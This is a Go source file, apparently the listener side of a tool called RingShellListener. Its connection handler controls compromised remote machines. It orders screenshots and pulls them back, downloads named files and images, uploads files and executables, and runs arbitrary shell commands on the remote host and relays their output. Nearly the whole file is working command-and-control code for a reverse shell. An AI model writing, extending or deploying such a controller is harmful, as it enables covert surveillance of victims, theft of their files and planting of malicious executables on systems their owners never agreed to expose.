package Server

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
	"www.github.com/MustafaAbdulazizHamza/RingShellListener/Files"
	"www.github.com/MustafaAbdulazizHamza/RingShellListener/Pics"
)

func handle(conn net.Conn, id string) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)
	for {
		cmd, ok := <-chs[id]
		if !ok {
			break
		}
		commands := strings.Split(cmd, " ")
		if commands[0] == "get" {
			if commands[1] == "screenshots" {
				conn.SetDeadline(time.Now().Add(timeout))
				if err := sendCmd("get screenshots", writer); err != nil {
					log.Println("Unable to send the command:", err)
					break
				}
				conn.SetDeadline(time.Now().Add(timeout))
				ssN, err := reader.ReadString('\n')
				if err != nil {
					log.Println("Unable to get the number of screenshots:", err)
					break
				}
				NumberOfScreenshots, err := strconv.Atoi(strings.TrimSpace(ssN))
				if err != nil {
					log.Println("Unable to convert the number of screenshots to int:", err)
					break
				}
				for i := 0; i < NumberOfScreenshots; i++ {
					now := time.Now()
					if err := Pics.ReceiveAndSaveImage(conn, outputDir, fmt.Sprintf("screenshot-%s-%d.png", now.Format("2006-01-02_15:04:05"), i)); err != nil {
						log.Println(err)
						break
					}
				}

			} else if commands[1] == "image" {
				conn.SetDeadline(time.Now().Add(timeout))
				if err := sendCmd(cmd, writer); err != nil {
					log.Println("Unable to send the command:", err)
					break
				}

				for _, imageName := range commands[2:] {
					err := Pics.ReceiveAndSaveImage(conn, outputDir, imageName)
					if errors.Is(err, os.ErrNotExist) {
						log.Printf("Image %s was not found.\n", imageName)
						continue
					} else if err != nil {
						log.Println(err)
						break
					}
				}
			} else if commands[1] == "file" {
				conn.SetDeadline(time.Now().Add(timeout))
				if err := sendCmd(cmd, writer); err != nil {
					log.Println("Unable to send the command:", err)
					break
				}
				for _, fileName := range commands[2:] {
					err := Files.ReceiveFileContents(fmt.Sprintf("%s/%s", outputDir, fileName), conn, timeout)
					if errors.Is(err, os.ErrNotExist) {
						log.Printf("The file %s was not found on the remote machine.\n", fileName)
						continue
					}
					if err != nil {
						log.Println(err)
						break
					}
				}
			}

		} else if commands[0] == "upload" {
			if commands[1] == "file" || commands[1] == "executable" {
				files := FileNamesParser(commands)
				conn.SetDeadline(time.Now().Add(timeout))
				if err := sendCmd(fmt.Sprintf("upload %s %s", commands[1], files), writer); err != nil {
					log.Println("Unable to send the command:", err)
					break
				}
				for _, fi := range commands[2:] {
					if err := Files.SendFileContents(fi, conn, timeout); errors.Is(err, os.ErrNotExist) {
						log.Printf("The file %s was not found on your local machine.\n", fi)
						continue
					} else if err != nil {
						log.Println("Unable to upload file:", err)
						break
					}
				}
			} else {
				log.Println("You have entered an illegal upload command.")
			}
		} else {
			conn.SetDeadline(time.Now().Add(timeout))
			if err := sendCmd(cmd, writer); err != nil {
				chs[id] <- fmt.Sprint("Unable to send the command:", err)
				break
			}
			var (
				output  strings.Builder
				isError bool = false
			)
			for {
				conn.SetDeadline(time.Now().Add(timeout))
				out := make([]byte, 1024)
				n, err := reader.Read(out)
				if err == io.EOF {
					break
				}
				if err != nil {
					isError = true
					chs[id] <- fmt.Sprint("Unable to receive the output:", err)
					break
				}
				output.Write(out)
				if n < 1024 {
					break
				}
			}
			if isError {
				break
			}
			chs[id] <- output.String()
		}
	}

	closeConnectionStuff(id)

}
